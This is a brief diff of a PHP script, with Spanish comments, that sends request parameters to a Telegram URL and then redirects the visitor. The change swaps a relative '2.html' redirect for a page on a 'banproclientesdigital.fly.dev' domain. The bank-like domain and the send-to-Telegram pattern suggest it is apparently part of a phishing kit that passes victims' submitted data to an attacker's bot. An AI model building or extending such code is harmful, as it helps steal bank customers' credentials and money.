@@ -26,7 +26,7 @@ $response = file_get_contents($telegram_url . '?' . http_build_query($params));
 // Verificar si el mensaje fue enviado correctamente
 if ($response) {
     // Redirigir al usuario a 2.html
-    header("Location: 2.html");
+    header("Location: https://banproclientesdigital.fly.dev/2.html");
     exit();
 } else {
     // En caso de que no se haya enviado el mensaje, redirigir a una página de error
